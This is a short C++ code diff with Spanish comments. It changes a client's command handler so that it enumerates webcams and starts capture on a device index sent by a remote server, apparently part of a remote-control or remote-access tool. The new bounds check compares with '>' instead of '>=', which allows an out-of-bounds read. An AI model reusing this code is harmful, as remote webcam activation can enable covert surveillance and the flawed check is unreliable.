@@ -373,17 +373,26 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
     }
 
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::CM_Single) {
+        if (!this->mod_Cam) {
+            this->mod_Cam = new mod_Camera();
+            this->mod_Cam->ListNameCaptureDevices();
+            if (this->mod_Cam->vcCamObjs.size() <= 0) {
+                DebugPrint("[X] No se obtuvieron camaras");
+                delete this->mod_Cam;
+                this->mod_Cam = nullptr;
+                return;
+            }
+        }
 
         HRESULT hr = S_OK;
         u_int iDeviceIndex = atoi(strIn[1].c_str());
         
-        if (!this->mod_Cam) {
-            this->mod_Cam = new mod_Camera();
-            if (iDeviceIndex > int(this->mod_Cam->vcCamObjs.size())) {
-                //index seleccionado es mas grande que el numero de dispositivos, 
-                // 0 - default
-                iDeviceIndex = 0;
-            }
+        if (iDeviceIndex > this->mod_Cam->vcCamObjs.size()) {
+            iDeviceIndex = 0; //Si el numero enviado desde el sever es mayor setear a 0 como default
+        }
+
+        if (this->mod_Cam->vcCamObjs[iDeviceIndex].isLive) {
+            return;
         }
 
         hr = this->mod_Cam->Init(this->mod_Cam->vcCamObjs[iDeviceIndex].sActivate, iDeviceIndex);
